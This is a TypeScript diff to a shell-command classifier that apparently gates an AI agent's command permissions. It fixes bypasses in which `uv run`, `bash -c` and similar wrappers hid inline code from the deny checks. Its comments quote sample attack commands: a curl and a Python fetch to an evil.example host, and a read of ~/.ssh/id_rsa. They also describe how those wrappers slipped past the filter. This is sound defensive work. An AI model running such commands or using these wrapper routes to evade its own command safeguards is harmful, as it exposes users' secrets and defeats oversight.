@@ -1432,7 +1432,7 @@ function splitPipeRespectQuotes(command: string): string[] {
   return parts
 }
 
-function classifySingleCommand(command: string): ClassifyResult {
+function classifySingleCommand(command: string, denyReadPaths: string[] = []): ClassifyResult {
   let trimmed = command.trim()
   // Strip one or more leading '(' (subshell groups) so `(lsof -ti:3000 | xargs …)`
   // is classified by its inner command, not rejected as unknown "(lsof …".
@@ -1449,7 +1449,7 @@ function classifySingleCommand(command: string): ClassifyResult {
     if (!inner || /^-\w/.test(inner)) {
       return { category: 'read', reason: 'nohup help/flag', targetPaths: [] }
     }
-    return classifySingleCommand(inner)
+    return classifySingleCommand(inner, denyReadPaths)
   }
 
   // `env CMD` runs CMD with an adjusted environment — classify the INNER
@@ -1463,7 +1463,7 @@ function classifySingleCommand(command: string): ClassifyResult {
     if (!inner || /^-\w/.test(inner)) {
       return { category: 'read', reason: 'env help/flag', targetPaths: [] }
     }
-    return classifySingleCommand(inner)
+    return classifySingleCommand(inner, denyReadPaths)
   }
 
   // Check catastrophic patterns first
@@ -1487,7 +1487,7 @@ function classifySingleCommand(command: string): ClassifyResult {
   // quote- and escape-aware so grep patterns keep their "|" intact.
   const pipeParts = splitPipeRespectQuotes(trimmed)
   if (pipeParts.length > 1) {
-    const sub = pipeParts.map((p) => classifySingleCommand(p.trim()))
+    const sub = pipeParts.map((p) => classifySingleCommand(p.trim(), denyReadPaths))
     const localPriority: OpCategory[] = [
       'system', 'network', 'vcs_remote', 'package', 'process',
       'mixed', 'unknown', 'file_write', 'vcs_local', 'local_exec', 'local_network', 'read',
@@ -1580,6 +1580,45 @@ function classifySingleCommand(command: string): ClassifyResult {
     }
   }
 
+/**
+ * uv flags that take a value (strip the flag AND its value from a `uv run`
+ * prefix). Everything else starting with `-` is treated as boolean and
+ * consumed alone; `--name=value` consumes itself; `--` stops flag parsing.
+ * Mirrors uv's real CLI so `uv run --no-sync python3 -c "…"` keeps
+ * `python3` as the interpreter token (R13 blocker fix).
+ */
+const UV_VALUE_FLAGS = new Set([
+  '--python', '-p', '--directory', '-d', '--project', '--script',
+  '--with-requirements', '--index-url', '--extra-index-url', '--find-links',
+  '--python-platform', '--python-version', '--group',
+])
+
+function stripUvRunFlags(s: string): string {
+  const toks = s.split(/\s+/)
+  let i = 0
+  while (i < toks.length) {
+    const t = toks[i]
+    if (t === '--') {
+      i++
+      break
+    }
+    if (t.startsWith('-') && t.length > 1) {
+      if (t.includes('=')) {
+        i++ // --x=y consumes itself
+        continue
+      }
+      if (UV_VALUE_FLAGS.has(t)) {
+        i += 2 // flag + its value
+        continue
+      }
+      i++ // boolean flag
+      continue
+    }
+    break // first non-flag token (interpreter or script)
+  }
+  return toks.slice(i).join(' ')
+}
+
   // uv is a Python/tool package manager: install/add/remove/sync/tool install
   // and `run --with` hit the network and must be denied; version/help/
   // list/show/python/cache/init and plain `uv run script.py` are local
@@ -1635,22 +1674,29 @@ function classifySingleCommand(command: string): ClassifyResult {
     // `uv run python3 -c "import urllib.request; ...evil.example..."` rode
     // local_exec below — the wrapped interpreter's inline code never entered
     // the danger nets (`python3 -c` alone and `env python3 -c` both deny the
-    // same code). Strip the uv wrapper (flags included) and re-classify the
-    // interpreter command, mirroring the bash -c recursion; local scripts
+    // same code). Strip the uv wrapper and re-classify the interpreter
+    // command, mirroring the bash -c recursion; local scripts
     // (`uv run script.py`) and version probes still fall through to local_exec.
+    // R13: flag stripping must follow uv's real syntax — only known
+    // value-taking flags consume a token (`--no-sync python3 -c ...` must
+    // NOT eat `python3`), `--x=y` consumes itself, `--` stops flag parsing;
+    // the recursion must forward denyReadPaths (else -c code reading a
+    // sensitive path escapes forceDeny), and a name that merely LOOKS like
+    // an interpreter (python3x/ipython3/…) fails closed instead of riding
+    // local_exec.
     if (uvSub === 'run') {
-      const afterRun = rest
-        .replace(/^run\s+/, '')
-        .replace(/^(?:--[a-zA-Z0-9-]+(?:\s+\S+)?\s+)+/, '')
-        .trim()
+      const afterRun = stripUvRunFlags(rest.replace(/^run\s+/, ''))
       const interp = afterRun.split(/\s+/)[0]?.toLowerCase().split('/').pop() ?? ''
-      // Same wrapper-strip for shell interpreters: `uv run bash -c "curl
-      // http://evil.example/x"` must hit the bash -c recursion like bare
-      // `bash -c`, not ride local_exec (R13-followup, same allow-side class).
       if (LOCAL_EXEC_COMMANDS.has(interp) || PY_INTERPRETER_RE.test(interp) ||
           ['bash', 'sh', 'zsh', 'dash'].includes(interp)) {
-        const inner = classifyBashCommand(afterRun, [])
+        const inner = classifyBashCommand(afterRun, denyReadPaths)
         if (inner.category !== 'local_exec') return inner
+      } else if (/^(?:ipython|python|pypy|node)/.test(interp)) {
+        return {
+          category: 'unknown',
+          reason: `Unknown interpreter after uv run: ${fullCmd}`,
+          targetPaths: [],
+        }
       }
     }
     return {
@@ -1677,7 +1723,9 @@ function classifySingleCommand(command: string): ClassifyResult {
       const m = rest.match(/^-c\s+(?:"([^"]*)"|'([^']*)'|(\S+))/)
       const code = m?.[1] ?? m?.[2] ?? m?.[3]
       if (code) {
-        const inner = classifyBashCommand(code, [])
+        // R13: forward denyReadPaths — `bash -c "cat ~/.ssh/id_rsa"` must
+        // forceDeny under a sensitive dir, not lose the context here.
+        const inner = classifyBashCommand(code, denyReadPaths)
         return inner
       }
       return {
@@ -1707,13 +1755,13 @@ function classifySingleCommand(command: string): ClassifyResult {
     const shellM = rest.match(/(?:^|\s)(?:sh|bash|zsh|dash)\s+-c\s+(?:"([^"]*)"|'([^']*)')/)
     if (shellM) {
       const code = shellM[1] ?? shellM[2] ?? ''
-      if (code) return classifyBashCommand(code, [])
+      if (code) return classifyBashCommand(code, denyReadPaths)
     }
     const toks = rest.split(/\s+/)
     const first = toks.find((t) => !t.startsWith('-') && t !== '{}')
     if (first) {
       const idx = toks.indexOf(first)
-      return classifyBashCommand(toks.slice(idx).join(' '), [])
+      return classifyBashCommand(toks.slice(idx).join(' '), denyReadPaths)
     }
     return {
       category: 'local_exec',
@@ -1740,7 +1788,7 @@ function classifySingleCommand(command: string): ClassifyResult {
           targetPaths: [],
         }
       }
-      const inner = classifySingleCommand(wrapped.command)
+      const inner = classifySingleCommand(wrapped.command, denyReadPaths)
       if (inner.category !== 'local_exec' && inner.category !== 'read') {
         return {
           ...inner,
@@ -2416,7 +2464,7 @@ export function classifyBashCommand(
     return { category: 'read', reason: 'Empty command', targetPaths: [] }
   }
 
-  const results = segments.map(classifySingleCommand)
+  const results = segments.map((p) => classifySingleCommand(p, denyReadPaths))
 
   // Track `cd` across segments so relative paths after `cd dir && …` resolve
   // under `dir` instead of the process cwd (prevents false denials for
